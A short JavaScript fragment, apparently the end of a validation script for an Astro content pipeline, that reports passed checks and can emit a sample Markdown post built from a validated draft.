console.log(`\n${passed} checks passed${process.exitCode ? ' — with failures above' : ''}.\n`);

// Emit a sample file so the caller can feed it to the real Astro schema.
if (process.argv.includes('--emit')) {
  const d = validateDraft(JSON.stringify(good), opts);
  process.stdout.write(buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' }));
}
